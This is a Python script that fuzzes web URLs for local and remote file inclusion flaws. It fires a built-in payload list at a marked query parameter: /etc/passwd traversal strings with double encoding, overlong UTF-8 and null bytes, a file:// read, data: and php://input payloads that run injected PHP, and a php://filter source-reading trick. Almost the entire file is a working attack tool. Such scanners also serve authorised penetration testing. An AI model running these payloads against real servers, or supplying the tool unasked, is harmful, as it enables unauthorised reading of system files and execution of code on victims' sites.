#!/bin/env python
# coding=utf-8

import requests
import argparse
import logging
from urllib.parse import urlparse

logging.basicConfig(level=logging.INFO, format='%(message)s')


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


target_flag = 'XXpathXX'
# read source:
# php://filter/read=convert.base64-encode/resource=./index.php
# reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

payloads = {
    'data:text/plain,<?php%20echo%20%27coldhurt%27%20?>': 'coldhurt',
    '/etc/passwd': 'root:',
    '/etc/passwd%00': 'root:',
    '%252e%252e%252fetc%252fpasswd': 'root:',
    '%252e%252e%252fetc%252fpasswd%00': 'root:',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd': 'root:',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00': 'root:',
    'file:///etc/passwd': 'root:'
}


def get_headers(headers):
    header_obj = {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
    }
    if headers:
        headers = headers.split(',')
        for i in headers:
            key, value = i.split(':')
            header_obj[key.lower()] = value.strip()
    return header_obj


def post_fuzz(url, headers={}):
    target = url.replace(target_flag, 'php://input')
    post_payload = '<?php echo "coldhurt" ?>'
    res = requests.post(target, data=post_payload, headers=headers)
    if res.status_code == 200 and res.content.decode('utf-8').find('coldhurt') != -1:
        logging.info(bcolors.OKGREEN + "[+] POC: %s" % target)
        logging.info(bcolors.OKBLUE + "[+] POST data: %s" % post_payload)
    else:
        logging.info("POST is not vulnerable")


def fuzzer(args):
    url = args['url']
    headers = args['headers']
    verbose = args['verbose']
    if url.startswith('http') or url.find(target_flag) != -1:
        header_obj = get_headers(headers)
        if verbose:
            logging.info('[*] HEADERS:' + str(header_obj))
        if args['post']:
            post_fuzz(url, header_obj)
        else:
            for key in payloads:
                target = url.replace(target_flag, key)
                res = requests.get(target, headers=header_obj)
                status_code = res.status_code
                if status_code == 200:
                    if res.content.decode('utf-8').find(payloads[key]) != -1:
                        logging.info(bcolors.OKGREEN +
                                     "[+] POC: %s" % (target))
                        return
                    elif verbose:
                        logging.info("[*] %s is not vulnerable" % target)
                elif str(status_code).startswith('3'):
                    logging.info(bcolors.FAIL +
                                 "[*] Target redirect, maybe you should change cookie")
                    return
                else:
                    logging.info(bcolors.FAIL +
                                 "[x] %s is not vulnerable" % url)
                    return

            logging.info(bcolors.FAIL + "[x] %s is not vulnerable" % url)
    else:
        logging.info('[x] url is invalid')


def main():
    parse = argparse.ArgumentParser(
        description='This program is designed to fuzz remote or local include vulnerability')
    parse.add_argument('url', action='store',
                       help='target url, you must replace the target query variable\'s value with XXpathXX')
    parse.add_argument('-H', default='', dest='headers',
                       action='store', help='http headers')
    parse.add_argument('-p', dest='post',
                       action='store_true', help='add this to test post method')
    parse.add_argument('-v', dest='verbose',
                       action='store_true', help='show verbose')
    args = vars(parse.parse_args())
    fuzzer(args)


if __name__ == '__main__':
    main()
